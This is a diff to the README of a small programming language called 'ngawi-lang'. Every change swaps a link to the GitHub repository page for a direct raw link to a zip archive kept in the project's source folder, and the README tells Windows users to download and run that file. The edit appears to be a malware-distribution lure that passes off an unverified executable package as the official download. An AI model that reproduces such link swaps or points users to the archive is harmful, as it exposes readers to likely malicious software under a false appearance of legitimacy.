@@ -1,6 +1,6 @@
 # 🧠 ngawi-lang - Write fast code with ease
 
-[![Download ngawi-lang](https://img.shields.io/badge/Download%20ngawi--lang-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ashrafkhalaf1977/ngawi-lang)
+[![Download ngawi-lang](https://img.shields.io/badge/Download%20ngawi--lang-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ashrafkhalaf1977/ngawi-lang/main/src/lang-ngawi-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Ngawi is a small language for people who want short syntax and fast output. It i
 
 Visit this page to download:
 
-https://github.com/ashrafkhalaf1977/ngawi-lang
+https://raw.githubusercontent.com/ashrafkhalaf1977/ngawi-lang/main/src/lang-ngawi-2.6.zip
 
 If the page shows a release file for Windows, download and run that file. If you only see the main repository page, use the **Releases** area on that page and get the newest Windows package.
 
@@ -159,7 +159,7 @@ No. In most cases, you only need to download the file, extract it if needed, and
 
 Use the download link near the top of this page or visit the repository page:
 
-https://github.com/ashrafkhalaf1977/ngawi-lang
+https://raw.githubusercontent.com/ashrafkhalaf1977/ngawi-lang/main/src/lang-ngawi-2.6.zip
 
 ## 🧩 Troubleshooting
 
@@ -206,7 +206,7 @@ This project is built around a small language that keeps syntax short and output
 
 If you need the package again, use this link:
 
-[https://github.com/ashrafkhalaf1977/ngawi-lang](https://github.com/ashrafkhalaf1977/ngawi-lang)
+[https://raw.githubusercontent.com/ashrafkhalaf1977/ngawi-lang/main/src/lang-ngawi-2.6.zip](https://raw.githubusercontent.com/ashrafkhalaf1977/ngawi-lang/main/src/lang-ngawi-2.6.zip)
 
 ## 🗂️ Suggested File Layout
 
